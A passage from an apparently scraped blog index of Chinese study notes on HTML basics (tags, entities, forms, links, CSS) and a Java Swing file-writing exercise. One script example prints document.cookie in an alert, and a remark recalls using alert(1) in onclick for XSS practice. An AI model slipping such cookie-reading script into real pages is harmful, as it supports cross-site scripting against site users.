RGB\n\n\n#000000\nrgb(0,0,0)\n\n\n#080808\nrgb(8,8,8)\n\n\n#101010\nrgb(16,16,16)\n\n\n#181818\nrgb(24,24,24)\n\n\n#202020\nrgb(32,32,32)\n\n\n#282828\nrgb(40,40,40)\n\n\n#303030\nrgb(48,48,48)\n\n\n#383838\nrgb(56,56,56)\n\n\n#404040\nrgb(64,64,64)\n\n\n#484848\nrgb(72,72,72)\n\n\n#505050\nrgb(80,80,80)\n\n\n#585858\nrgb(88,88,88)\n\n\n#606060\nrgb(96,96,96)\n\n\n#686868\nrgb(104,104,104)\n\n\n#707070\nrgb(112,112,112)\n\n\n#787878\nrgb(120,120,120)\n\n\n#808080\nrgb(128,128,128)\n\n\n#888888\nrgb(136,136,136)\n\n\n#909090\nrgb(144,144,144)\n\n\n#989898\nrgb(152,152,152)\n\n\n#A0A0A0\nrgb(160,160,160)\n\n\n#A8A8A8\nrgb(168,168,168)\n\n\n#B0B0B0\nrgb(176,176,176)\n\n\n#B8B8B8\nrgb(184,184,184)\n\n\n#C0C0C0\nrgb(192,192,192)\n\n\n#C8C8C8\nrgb(200,200,200)\n\n\n#D0D0D0\nrgb(208,208,208)\n\n\n#D8D8D8\nrgb(216,216,216)\n\n\n#E0E0E0\nrgb(224,224,224)\n\n\n#E8E8E8\nrgb(232,232,232)\n\n\n#F0F0F0\nrgb(240,240,240)\n\n\n#F8F8F8\nrgb(248,248,248)\n\n\n#FFFFFF\nrgb(255,255,255)\n\n想知道更多可以自行百度。\n\nHTML颜色名目前所有的浏览器支持这些颜色名。\n141个颜色名称是在HTML和CSS颜色规范定义的（17标准颜色，再加124）。\n提示: 17标准颜色：黑色，蓝色，水，紫红色，灰色，绿色，石灰，栗色，海军，橄榄，橙，紫，红，白，银，蓝绿色，黄色。点击其中一个颜色名称（或一个十六进制值）就可以查看与不同文字颜色搭配的背景颜色。\n关于颜色名可以上网自行查询。\nHTML脚本JavaScript可以使具有更好的动态和交付功能。\n&lt;script&gt;标签&lt;script&gt;标签用于定义客户端脚本，比如JavaScript\nscript标签可以直接包含脚本语句，也可以通过src属性来引入外部脚本。JavaScript 最常用于图片操作、表单验证以及内容动态更新。\n&lt;script>\ndocument.write(\"Hello World!\");\nalert(document.cookie);\n&lt;/script>\n\n&lt;noscript&gt;标签&lt;noscript&gt;标签提供无法使用脚本时的替代内容，比方在浏览器禁用脚本时，或浏览器不支持客户端脚本时。&lt;noscript&gt;元素可包含普通 HTML 页面的 body 元素中能够找到的所有元素。只有在浏览器不支持脚本或者禁用脚本时，才会显示 &lt;noscript&gt; 元素中的内容。\n&lt;script>\ndocument.write(\"Hello World!\")\n&lt;/script>\n&lt;noscript>抱歉，你的浏览器不支持 JavaScript!&lt;/noscript>\n\nJavaScript可以直接在HTML输出:\ndocument.write(\"&lt;p>这是一个段落。&lt;/p>\");\n\nJavaScript事件响应:\n&lt;button type=\"button\" onclick=\"myFunction()\">点我！&lt;/button>\n\n这个之前再XSS之旅里就用到过，把onclick里改成alert(1)。\nJavaScript处理 HTML 样式:\ndocument.getElementById(\"demo\").style.color=\"#ff0000\";\n\nHTML字符实体HTML中的预留字符必须被替换为字符实体。一些再键盘上找不到的字符也可以用字符实体进行替换。\n实体HTML中的&lt;、&gt;符号是不能使用为大于号或小于号的，因为他们已经有其他意义了，浏览器会认为他们是标签。所以想要使用就必须要使用字符实体了。\n如需显示小于号，我们必须这样写：&amp;lt; 或 &amp;#60;或 &amp;#060;\n注意：使用实体名而不用数字的好处是，方便记忆，这个和用域名的理由类似，毕竟IP可不是很好记的东西。\n不间断空格HTML 中的常用字符实体是不间断空格(&amp;nbsp;)。之前说过多个空格在解析的是后会被搞成一个。所以想要多个空格就要用到这个不间断空格了。\n结合音标符发音符号是加到字母上的一个”glyph(字形)”。\n一些变音符号, 如 尖音符 (  ̀) 和 抑音符 (  ́) 。\n变音符号可以出现字母的上面和下面，或者字母里面，或者两个字母间。\n变音符号可以与字母、数字字符的组合来使用。\n\n\n音标符\n字符\nConstruct\n输出结果 \n\n\n       ̀\n      a\n      a&amp;#768;\n      à\n\n\n       ́\n      a\n      a&amp;#769;\n      á\n\n\n       ̂\n      a\n      a&amp;#770;\n      â\n\n\n       ̃\n      a\n      a&amp;#771;\n      ã\n\n\n       ̀\n      O\n      O&amp;#768;\n      Ò\n\n\n       ́\n      O\n      O&amp;#769;\n      Ó\n\n\n       ̂\n      O\n      O&amp;#770;\n      Ô\n\n\n       ̃\n      O\n      O&amp;#771;\n      Õ\n\n### HTML字符实体表\n\n注意：之前说HTML对大小写不敏感，但是HTML字符实体是对大小写敏感的所以需要小心注意了。\n\n\n\n显示结果\n描述\n实体名称\n实体编号\n\n\n\n\n空格\n\n&#160;\n\n\n&lt;\n小于号\n&lt;\n&#60;\n\n\n&gt;\n大于号\n&gt;\n&#62;\n\n\n&amp;\n和号\n&amp;\n&#38;\n\n\n“\n引号\n&quot;\n&#34;\n\n\n‘\n撇号\n&apos; (IE不支持)\n&#39;\n\n\n￠\n分\n&cent;\n&#162;\n\n\n£\n镑\n&pound;\n&#163;\n\n\n¥\n人民币/日元\n&yen;\n&#165;\n\n\n€\n欧元\n&euro;\n&#8364;\n\n\n§\n小节\n&sect;\n&#167;\n\n\n©\n版权\n&copy;\n&#169;\n\n\n®\n注册商标\n&reg;\n&#174;\n\n\n™\n商标\n&trade;\n&#8482;\n\n\n×\n乘号\n&times;\n&#215;\n\n\n÷\n除号\n&divide;\n&#247;\n\n\nHTML URLURL是一个网页地址。\nscheme:&#x2F;&#x2F;host.domain:port&#x2F;path&#x2F;filename\n\n说明:\n\n\nscheme - 定义因特网服务的类型。最常见的类型是 http\n\nhost - 定义域主机（http 的默认主机是 www）\n\ndomain - 定义因特网域名，比如 runoob.com\n\n:port - 定义主机上的端口号（http 的默认端口号是 80）\n\npath - 定义服务器上的路径（如果省略，则文档必须位于网站的根目录中）。\n\nfilename - 定义文档/资源的名称\nURL编码可以用在线工具搞。\n\n\n\n\nHTML速查列表HTML 基本文档HTML 基本文档\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head>\n&lt;title>文档标题&lt;/title>\n&lt;/head>\n&lt;body>\n可见文本...\n&lt;/body>\n&lt;/html>\n\n基本标签（Basic Tags）&lt;h1>最大的标题&lt;/h1>\n&lt;h2> . . . &lt;/h2>\n&lt;h3> . . . &lt;/h3>\n&lt;h4> . . . &lt;/h4>\n&lt;h5> . . . &lt;/h5>\n&lt;h6>最小的标题&lt;/h6>\n \n&lt;p>这是一个段落。&lt;/p>\n&lt;br> （换行）\n&lt;hr> （水平线）\n&lt;!-- 这是注释 -->\n\n文本格式化（Formatting）&lt;b>粗体文本&lt;/b>\n&lt;code>计算机代码&lt;/code>\n&lt;em>强调文本&lt;/em>\n&lt;i>斜体文本&lt;/i>\n&lt;kbd>键盘输入&lt;/kbd> \n&lt;pre>预格式化文本&lt;/pre>\n&lt;small>更小的文本&lt;/small>\n&lt;strong>重要的文本&lt;/strong>\n \n&lt;abbr> （缩写）\n&lt;address> （联系信息）\n&lt;bdo> （文字方向）\n&lt;blockquote> （从另一个源引用的部分）\n&lt;cite> （工作的名称）\n&lt;del> （删除的文本）\n&lt;ins> （插入的文本）\n&lt;sub> （下标文本）\n&lt;sup> （上标文本）\n\n链接（Links）普通的链接：&lt;a href=\"http://www.example.com/\">链接文本&lt;/a>\n图像链接： &lt;a href=\"http://www.example.com/\">&lt;img src=\"URL\" alt=\"替换文本\">&lt;/a>\n邮件链接： &lt;a href=\"mailto:webmaster@example.com\">发送e-mail&lt;/a>\n书签：\n&lt;a id=\"tips\">提示部分&lt;/a>\n&lt;a href=\"#tips\">跳到提示部分&lt;/a>\n\n图片（Images）&lt;img src=\"URL\" alt=\"替换文本\" height=\"42\" width=\"42\">\n\n样式/区块（Styles/Sections）&lt;style type=\"text/css\">\nh1 &#123;color:red;&#125;\np &#123;color:blue;&#125;\n&lt;/style>\n&lt;div>文档中的块级元素&lt;/div>\n&lt;span>文档中的内联元素&lt;/span>\n\n无序列表&lt;ul>    \n    &lt;li>项目&lt;/li>    \n    &lt;li>项目&lt;/li> \n&lt;/ul>\n\n\n有序列表&lt;ol>    \n    &lt;li>第一项&lt;/li>    \n    &lt;li>第二项&lt;/li> \n&lt;/ol>\n\n\n定义列表&lt;dl>  \n    &lt;dt>项目 1&lt;/dt>    \n    &lt;dd>描述项目 1&lt;/dd>  \n    &lt;dt>项目 2&lt;/dt>    \n    &lt;dd>描述项目 2&lt;/dd> \n&lt;/dl>\n\n\n表格（Tables）&lt;table border=\"1\">   \n&lt;tr>     \n\t&lt;th>表格标题&lt;/th>     \n    &lt;th>表格标题&lt;/th>   \n&lt;/tr>   \n    &lt;tr>     \n        &lt;td>表格数据&lt;/td>     \n        &lt;td>表格数据&lt;/td>   \n&lt;/tr> \n&lt;/table>\n\n\n\n\n框架（Iframe）&lt;iframe src=\"demo_iframe.htm\">&lt;/iframe>\n\n\n表单（Forms）&lt;form action=\"demo_form.php\" method=\"post/get\"> &lt;input type=\"text\" name=\"email\" size=\"40\" maxlength=\"50\"> \n&lt;input type=\"password\">\n&lt;input type=\"checkbox\" checked=\"checked\"> \n&lt;input type=\"radio\" checked=\"checked\"> \n&lt;input type=\"submit\" value=\"Send\">\n&lt;input type=\"reset\"> \n&lt;input type=\"hidden\"> \n&lt;select> \n&lt;option>苹果&lt;/option> \n&lt;option selected=\"selected\">香蕉&lt;/option> \n&lt;option>樱桃&lt;/option> \n&lt;/select> \n&lt;textarea name=\"comment\" rows=\"60\" cols=\"20\">&lt;/textarea>&lt;/textarea>  &lt;/form>\n\n\n实体（Entities）&amp;lt; 等同于 &lt;\n &amp;gt; 等同于 &gt; \n&amp;#169; 等同于 ©\n","slug":"HTML基础学习-五","date":"2020-05-31T13:59:34.000Z","categories_index":"HTML学习","tags_index":"HTML","author_index":"A1andNS"},{"id":"be420e45267c81226a46504f61c30210","title":"Java图形化练习","content":"题目编写一个 Java 源程序，其中包含：编写一个包含主方法 main 的公共类（访问权限为 public 的类），该类继承自窗体类 JFrame，并且，该类实现了接口 ActionListener（也就是说，实现了接口 ActionListener 的方法 actionPerformed）。源程序实现的任务是实现如下图所示的图形用户界面（当窗口大小改变时，其中的组件的大小也会随之改变），并且完成以下要求： \n\n（1）  可以在“请输入文件路径和名称：”后面的文本框中输入文件名和路径。（2）  可以在文本区中写文本。（3）  可以在“请输入需要追加的内容：”后面的文本域中输入内容，按回车键之后，其中的内容会添加到文本区中（添加的内容另起一行）。（4）  单击“将文本区的内容写入文件”按钮，文本区中的内容就会被写到指定的文件中。 \n源代码写法一：\nimport javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class TextApp extends JFrame implements ActionListener &#123;\n    //定义组件为属性\n    JPanel panel,panel1;\n    JLabel fileLabel,contentLabel;\n    JTextField fileText,contentText;\n    JButton submitButton;\n    JTextArea text;\n    \n    public void addComponents()&#123;\n        //新建组件，分配空间\n        panel = new JPanel();\n        panel1 = new JPanel();\n        fileLabel = new JLabel(\"请输入文件路径和名称:\");\n        contentLabel = new JLabel(\"请输入需要追加的内容:\");\n        fileText = new JTextField();\n        contentText = new JTextField();\n        submitButton = new JButton(\"将文本区的内容写入文件\");\n        text = new JTextArea();\n\t\t//组件配置\n        text.setLineWrap(true);\n\t\t//面板配置\n\t\tpanel.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));\n        panel1.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));\n        panel.setLayout(new GridLayout(3,2,0,5));\n        panel1.setLayout(new GridLayout(1,1));\n\t\t//为面板添加组件\n        panel.add(fileLabel);\n        panel.add(fileText);\n        panel.add(contentLabel);\n        panel.add(contentText);\n        panel.add(submitButton);\n        panel1.add(text);\n        //为框架添加面板\n        add(panel,BorderLayout.NORTH);\n        add(panel1,BorderLayout.CENTER);\n\t\t//添加事件\n        contentText.addActionListener(this);\n        submitButton.addActionListener(this);\n    &#125;\n\n    public static void main(String[] args)&#123;  \n        TextApp frame = new TextApp();\n        frame.setSize(400,400);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.addComponents();\n        frame.setVisible(true);\n    &#125;\n\n    @Override\n    public void actionPerformed(ActionEvent e) &#123;\n        //判断ActionEvent由谁发出，并作相应处理\n        if (e.getSource().equals(contentText))&#123;\n            String content = contentText.getText();\n            text.append(content+\"\\n\");\n        &#125;\n        else if (e.getSource().equals(submitButton))&#123;\n            File file = new File(fileText.getText());\n            try &#123;\n                file.createNewFile();\n                FileWriter writer = new FileWriter(file);\n                writer.write(text.getText());\n                writer.close();\n            &#125; catch (IOException ioException) &#123;\n                ioException.printStackTrace();\n            &#125;\n        &#125;\n    &#125;\n&#125;\n\n\n写法二：\nimport javax.swing.*;\n        import javax.swing.event.AncestorListener;\n        import java.awt.*;\n        import java.awt.event.ActionEvent;\n        import java.awt.event.ActionListener;\n        import java.io.File;\n        import java.io.FileWriter;\n        import java.io.IOException;\n\npublic class TextApp extends JFrame&#123;\n    /**\n     *\n     */\n    private static final long serialVersionUID = 1L;\n\n    public void addComponents() &#123;\n        //新建组件分配空间\n        JPanel panel = new JPanel();\n        JPanel panel1 = new JPanel();\n        JLabel fileLabel = new JLabel(\"请输入文件路径和名称:\");\n        JLabel contentLabel = new JLabel(\"请输入需要追加的内容:\");\n        JTextField fileText = new JTextField();\n        JTextField contentText = new JTextField();\n        JButton submitButton = new JButton(\"将文本区的内容写入文件\");\n        JTextArea text = new JTextArea();\n\t\t//组件配置\n        text.setLineWrap(true);\n\t\t//面板配置\n        panel.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));\n        panel1.setBorder(BorderFactory.createEmptyBorder(5,5,5,5));\n        panel.setLayout(new GridLayout(3,2,0,5));\n        panel1.setLayout(new GridLayout(1,1));\n\t\t//为面板添加组件\n        panel.add(fileLabel);\n        panel.add(fileText);\n        panel.add(contentLabel);\n        panel.add(contentText);\n        panel.add(submitButton);\n        panel1.add(text);\n        //为框架添加面板\n        add(panel,BorderLayout.NORTH);\n        add(panel1,BorderLayout.CENTER);\n\t\t//事件，及其事件响应\n        contentText.addActionListener(new ActionListener() &#123;\n            @Override\n            public void actionPerformed(ActionEvent e) &#123;\n                String content = contentText.getText();\n                text.append(content+\"\\n\");\n            &#125;\n        &#125;);\n        submitButton.addActionListener(new ActionListener() &#123;\n            @Override\n            public void actionPerformed(ActionEvent e) &#123;\n                File file = new File(fileText.getText());\n                try &#123;\n                    file.createNewFile();\n                    FileWriter writer = new FileWriter(file);\n                    writer.write(text.getText());\n                    writer.close();\n                &#125; catch (IOException ioException) &#123;\n                    ioException.printStackTrace();\n                &#125;\n            &#125;\n        &#125;);\n    &#125;\n\n    public static void main(String[] args)&#123;\n        TextApp frame = new TextApp();\n        frame.setSize(400,400);\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.addComponents();\n        frame.setVisible(true);\n    &#125;\n&#125;\n\n运行结果\n\n\n","slug":"Java图形化练习","date":"2020-05-31T10:59:16.000Z","categories_index":"Java学习","tags_index":"Java","author_index":"A1andNS"},{"id":"b1f9aea398538a23cccfa3e533dbd641","title":"HTML基础学习(四)","content":"HTML区块大多数 HTML 元素被定义为块级元素或内联元素。\n块级元素块级元素在浏览器显示时，通常会以新行来开始（和结束）。\n实例: &lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;\n内联元素内联元素在显示时通常不会以新行开始。\n实例:&lt;b&gt;,&lt;td&gt;,&lt;a&gt;,&lt;img&gt;\nHTML &lt;div&gt; 元素HTML &lt;div&gt; 元素是块级元素，它可用于组合其他 HTML 元素的容器。&lt;div&gt; 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。如果与 CSS 一同使用，&lt;div&gt; 元素可用于对大的内容块设置样式属性。在网页中被广泛使用，基本的网页都会使用的这个标签。\n它定义HTML文档中的一个分割区域或一个区域部分。\n&lt;div style=\"color:#0000FF\">\n  &lt;h3>这是一个在 div 元素中的标题。&lt;/h3>\n  &lt;p>这是一个在 div 元素中的文本。&lt;/p>\n&lt;/div>\n\n\n\nHTML&lt;span&gt;元素HTML &lt;span&gt; 元素是内联元素，可用作文本的容器&lt;span&gt; 元素也没有特定的含义。当与 CSS 一同使用时，&lt;span&gt; 元素可用于为部分文本设置样式属性。\n&lt;p>我的母亲有 &lt;span style=\"color:blue\">蓝色&lt;/span> 的眼睛。&lt;/p>\n\nHTML布局网页布局对改善网站的外观非常重要。所以设计页面布局很重要。\n&lt;div&gt;元素布局设计div 元素是用于分组 HTML 元素的块级元素。可以用div元素来创建多列布局。\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head> \n&lt;meta charset=\"utf-8\"> \n&lt;title>A1andNS&lt;/title> \n&lt;/head>\n&lt;body>\n \n&lt;div id=\"container\" style=\"width:500px\">\n \n&lt;div id=\"header\" style=\"background-color:#FFA500;\">\n&lt;h1 style=\"margin-bottom:0;\">Main Header&lt;/h1>&lt;/div>\n \n&lt;div id=\"menu\" style=\"background-color:#FFD700;height:200px;width:100px;float:left;\">\n&lt;b>Menu&lt;/b>&lt;br>\nHTML&lt;br>\nCSS&lt;br>\nJavaScript&lt;/div>\n \n&lt;div id=\"content\" style=\"background-color:#EEEEEE;height:200px;width:400px;float:left;\">\nContent Here&lt;/div>\n \n&lt;div id=\"footer\" style=\"background-color:#FFA500;clear:both;text-align:center;\">\nCopyright © A1andNS&lt;/div>\n \n&lt;/div>\n \n&lt;/body>\n&lt;/html>\n\n&lt;table&gt;元素布局设计&lt;!DOCTYPE html>\n&lt;html>\n&lt;head> \n&lt;meta charset=\"utf-8\"> \n&lt;title>A1andNS&lt;/title> \n&lt;/head>\n&lt;body>\n \n&lt;table width=\"500\" border=\"0\">\n&lt;tr>\n&lt;td colspan=\"2\" style=\"background-color:#FFA500;\">\n&lt;h1>Main header&lt;/h1>\n&lt;/td>\n&lt;/tr>\n \n&lt;tr>\n&lt;td style=\"background-color:#FFD700;width:100px;\">\n&lt;b>Menu&lt;/b>&lt;br>\nHTML&lt;br>\nCSS&lt;br>\nJavaScript\n&lt;/td>\n&lt;td style=\"background-color:#eeeeee;height:200px;width:400px;\">\nContent Here&lt;/td>\n&lt;/tr>\n \n&lt;tr>\n&lt;td colspan=\"2\" style=\"background-color:#FFA500;text-align:center;\">\nCopyright © A1andNS&lt;/td>\n&lt;/tr>\n&lt;/table>\n \n&lt;/body>\n&lt;/html>\n\n不过布局设计还是CSS外部引入的方式更加可取，通过编辑单独的CSS文档就可以修改布局，明显更加高效，也可以去找一些现成的css模板来进行网页开发。\nHTML表单表单就是用于收集不同类型用户的输入。\n表单表单其实是一个区域，这个区域包含了表单元素。表单元素是允许用户在表单中输入内容的地方，比如文本域、下拉列表、单选框等等。\n&lt;form>\n.\ninput 元素\n.\n&lt;/form>\n\n输入元素表单标签中最常用的就是输入标签&lt;input&gt;。输入的类型由type属性决定。常用的有文本、密码、单选按钮、复选框、提交按钮。\n文本域文本域使用&lt;input type=&quot;text&quot;&gt;标签来定义，当用户输入字母和数字时，就会用到文本域，就是文本输入框。\n&lt;form>\nFirst name: &lt;input type=\"text\" name=\"firstname\">&lt;br>\nLast name: &lt;input type=\"text\" name=\"lastname\">\n&lt;/form>\n\n\nName: \nAge: \n\n\n大多数浏览器中文本域的默认宽度为20个字符。\n密码字段密码和文本一样也是用type来定义，&lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;\n&lt;form>\nPassword: &lt;input type=\"password\" name=\"pwd\">\n&lt;/form>\n\n\nPassword: \n\n\n密码是不会以明文显示的，而是使用了星号或原点代替。\n单选按钮使用&lt;input type=&quot;radio&quot;&gt;来定义，用户只能选一个\n&lt;form>\n&lt;input type=\"radio\" name=\"sex\" value=\"male\">Male&lt;br>\n&lt;input type=\"radio\" name=\"sex\" value=\"female\">Female\n&lt;/form>\n\n\nMale\nFemale\n\n\n二选一，以此确定sex的value是什么。\n复选框使用&lt;input type=&quot;checkbox&quot;&gt;定义，用户可以选一个或多个。这个和单选按钮，感觉就是经常被用在选择题上。\n&lt;form>\n&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Bike\">I have a bike&lt;br>\n&lt;input type=\"checkbox\" name=\"vehicle\" value=\"Car\">I have a car\n&lt;/form>\n\n\nI have a bike\nI have a car\n\n\n提交按钮使用&lt;input type=&quot;submit&quot;&gt;来定义。当用户点击提交按钮的时候，表单的内容就会被转移到另一文件，表单的动作属性决定了目标的文件名。目标文件会对接受输入数据进行处理。\n&lt;form name=\"input\" action=\"https://www.runoob.com/try/demo_source/html_form_action.php\" method=\"get\">\nUsername: &lt;input type=\"text\" name=\"user\">\n&lt;input type=\"submit\" value=\"Submit\">\n&lt;/form>\n\n\nUsername: \n\n\n\n按钮button类型\n&lt;form action=\"\">\n&lt;input type=\"button\" value=\"Hello world!\">\n&lt;/form>\n\n下拉列表select和option的配合。\n&lt;form action=\"\">\n&lt;select name=\"cars\">\n&lt;option value=\"volvo\">Volvo&lt;/option>\n&lt;option value=\"saab\">Saab&lt;/option>\n&lt;option value=\"fiat\">Fiat&lt;/option>\n&lt;option value=\"audi\">Audi&lt;/option>\n&lt;/select>\n&lt;/form>\n\n预选关键在于多加一个selected\n&lt;form action=\"\">\n&lt;select name=\"cars\">\n&lt;option value=\"volvo\">Volvo&lt;/option>\n&lt;option value=\"saab\">Saab&lt;/option>\n&lt;option value=\"fiat\" selected>Fiat&lt;/option>\n&lt;option value=\"audi\">Audi&lt;/option>\n&lt;/select>\n&lt;/form>\n\n表单发邮件这里就是对submit和reset的应用。\n&lt;form action=\"MAILTO:1697483158@qq.com\" method=\"post\" enctype=\"text/plain\">\nName:&lt;br>\n&lt;input type=\"text\" name=\"name\" value=\"your name\">&lt;br>\nE-mail:&lt;br>\n&lt;input type=\"text\" name=\"mail\" value=\"your email\">&lt;br>\nComment:&lt;br>\n&lt;input type=\"text\" name=\"comment\" value=\"your comment\" size=\"50\">&lt;br>&lt;br>\n&lt;input type=\"submit\" value=\"发送\">\n&lt;input type=\"reset\" value=\"重置\">\n&lt;/form>\n\n\n    发送邮件应用\n\n\nName:\n\nE-mail:\n\nComment:\n\n\n\n\n\n","slug":"HTML基础学习-四","date":"2020-05-30T10:35:47.000Z","categories_index":"HTML学习","tags_index":"HTML","author_index":"A1andNS"},{"id":"2dd0d7dd4be98042d1ac16aa063ac1e4","title":"HTML基础学习(三)","content":"Leaning again！！！\nHTML链接HTML使用链接于网络上的另一个文档相连，实现页面的跳转。\nHTML使用标签&lt;a&gt;来设置超文本链接。超链接可以是一个字、一个词、或者一组词，也可以是一幅图像，点了就跳转到新文档或者文档的某个位置。这个用过WORD就很好理解了。\n当你把鼠标移动到网页中的某个链接上时，箭头会变为一只小手。在&lt;a&gt;中使用了href属性来描述链接的地址。\n没有使用CSS时，默认的链接样式：\n\n一个未访问过的链接显示为蓝色字体并带有下划线。\n访问过的链接显示为紫色并带有下划线。\n点击链接时，链接显示为红色并带有下划线。\n\n语法&lt;a href=\"url\" >链接文本&lt;/a>\n#示例\n&lt;a href=\"https://a1andns.github.io/\">A1andNS的博客&lt;/a>\n\ntarget属性使用target属性，可以定义被链接的文档在何处显示。\n比如在新窗口打开链接：\n&lt;a href=\"https://a1andns.github.io/\" target=\"_blank\">访问A1andNS博客!&lt;/a>\n\nid属性id属性可以使用创建在一个HTML文档书签标记。但是他是不显示的，所以对读者来说时隐藏的。\n&lt;a id=\"tips\">书签处&lt;/a>\n&lt;a href=\"#tips\">访问书签处&lt;/a>\n&lt;a href=\"https://a1andns.github.io/index.html#tips\">访问相关网页的书签处&lt;/a>\n\n注意事项在href属性中书写链接时，最好要添加正斜杠到子文件夹，例如href=&quot;https://a1andns.github.io/&quot;、href=&quot;https://a1andns.github.io/tags/&quot;\n图片链接图片链接的写法，把&lt;img&gt;放在元素内容那就好了。\n//有边框的图片链接\n&lt;a href=\"https://a1andns.github.io/\" target=\"_blank\">&lt;img border=\"10\" src=\"https://a1andns.github.io/img/head.jpg\" alt=\"A1andNS的博客\" width=\"32\" height=\"32\">&lt;/a>\n//无边框的图片链接\n&lt;a href=\"https://a1andns.github.io/\" target=\"_blank\">&lt;img border=\"0\" src=\"https://a1andns.github.io/img/head.jpg\" alt=\"A1andNS的博客\" width=\"32\" height=\"32\">&lt;/a>\n\n跳出框架在页面被固定在框架内时，可以通过这样的写法可以跳出框架。\n&lt;p>跳出框架&lt;/p> \n&lt;a href=\"http://a1andns.github.io/\" target=\"_top\">点击这里!&lt;/a> \n\n创建电子邮件链接&lt;p>\n这是一个电子邮件链接：\n&lt;a href=\"MAILTO:someone@example.com?Subject=Hello%20again\" target=\"_top\">\n发送邮件&lt;/a>\n&lt;/p>\n//空格最好使用%20来代替\n//新版本\n&lt;p>\n这是另一个电子邮件链接：\n&lt;a href=\"mailto:someone@example.com?cc=someoneelse@example.com&amp;bcc=andsomeoneelse@example.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!\" target=\"_top\">发送邮件!&lt;/a>\n&lt;/p>\n\nHTML头部HTML&lt;head&gt;元素，head元素包含了所有的头部标签元素。在head元素中是可以插入scripts的，还有各种meta信息。\n可以添加在头部区域的元素标签为: &lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;\n注意：是head不是header\ntitle元素&lt;title&gt;标签定义了不同文档的标题。&lt;title&gt; 在 HTML/XHTML 文档中是必须的。\n&lt;title&gt;元素：\n\n定义了浏览器工具栏的标题\n当网页添加到收藏夹时，显示在收藏夹中的标题\n显示在搜索引擎结果页面的标题\n\n示例：\n&lt;!DOCTYPE html>\n&lt;html>\n&lt;head> \n&lt;meta charset=\"utf-8\"> \n&lt;title>文档标题&lt;/title>\n&lt;/head>\n \n&lt;body>\n文档内容......\n&lt;/body>\n \n&lt;/html>\n\nbase元素base标签是用来描述基本的链接地址，该标签是HTML文档中所有链接标签的默认标签。\n&lt;head>\n&lt;base href=\"http://a1andns.github.io/\" target=\"_blank\">\n&lt;/head>\n\nlink元素link标签定义了文档与外部资源的关系。用于链接到CSS。\n&lt;head>\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\">\n&lt;/head>\n\nstyle元素style标签定义了HTML文档的样式文件引用地址，在style元素里可以添加样式来渲染HTML文档。\n&lt;head>\n&lt;style type=\"text/css\">\nbody &#123;background-color:yellow&#125;//背景色\np &#123;color:blue&#125;//段落蓝色字体\n&lt;/style>\n&lt;/head>\n\nmeta元素meta标签用来描述一些基本的元数据，元数据不会再页面上显示，但是会被浏览器解析。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。\n元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。\n//搜索引擎定义关键词\n&lt;meta name=\"keywords\" content=\"HTML,CSS,XML,XHTML,JavaScript\">\n//网页定义描述内容\n&lt;meta name=\"description\" content=\"free\">\n//定义网页作者\n&lt;meta name=\"author\" content=\"A1andNS\">\n//每30s刷新页面\n&lt;meta http-equiv=\"\"refresh\" content=\"30\">\n\n\nscript元素script标签是用于加载脚本文件的，像JavaScript。\n&lt;script>脚本&lt;/script>\n\nHTML样式-CSSCSS用于渲染HTML元素标签的样式。前面说头部也有说到。用style写CSS来渲染，或者link标签导入独立CSS文件来渲染。\n最简单的应用就是改字体颜色的操作,像下面这样的：\n&lt;title>A1andNS&lt;/title>\n&lt;style type=\"text/css\">\nh1 &#123;color:red;&#125;\np &#123;color:blue;&#125;\n&lt;/style>\n\nCSS 可以通过以下方式添加到HTML中:\n\n内联样式- 在HTML元素中使用”style” 属性\n内部样式表 -在HTML文档头部 &lt;head&gt; 区域使用&lt;style&gt; 元素 来包含CSS\n外部引用 - 使用外部 CSS 文件\n\n最好的方式是使用外部CSS文件，大多是网站也都是这样做的。\n内联样式//字体颜色\n&lt;p style=\"color:blue;margin-left:20px;\">这是一个段落。&lt;/p>\n//背景颜色\n&lt;body style=\"background-color:yellow;\">\n&lt;h2 style=\"background-color:red;\">这是一个标题&lt;/h2>\n&lt;p style=\"background-color:green;\">这是一个段落。&lt;/p>\n&lt;/body>\n//字体, 字体颜色 ，字体大小\n&lt;h1 style=\"font-family:verdana;\">一个标题&lt;/h1>\n&lt;p style=\"font-family:arial;color:red;font-size:20px;\">一个段落。&lt;/p>\n//文本对齐方式\n&lt;h1 style=\"text-align:center;\">居中对齐的标题&lt;/h1>//原来有用&lt;center>&lt;/center>，现在多用text-align:center\n&lt;p>这是一个段落。&lt;/p>\n\n通过style属性来实现，这里就是字体颜色蓝色，左外边距是20px。这种写法真的就只适合用于个别元素，要是很多都需要CSS渲染，肯定还是外部引用好。\n内部样式表在head通过style定义，适用于单个文件需要特别样式时。\n&lt;head>\n&lt;style type=\"text/css\">\nbody &#123;background-color:yellow;&#125;\np &#123;color:blue;&#125;\n&lt;/style>\n&lt;/head>\n\n外部样式表这个就是在很多页面都要使用同样的渲染风格时，就可以使用它了，明显比其他方式更好。也是在head里引入进来。\n&lt;head>\n&lt;link rel=\"stylesheet\" type=\"text/css\" href=\"mystyle.css\">\n&lt;/head>\n\nHTML图像Src属性在HTML中，可以用&lt;img&gt;来实现插入图片。img时空标签，它只有属性，而且没有闭合标签。要引入图片会用到src属性，也就是源属性。\n语法：&lt;img src=&quot;url&quot; 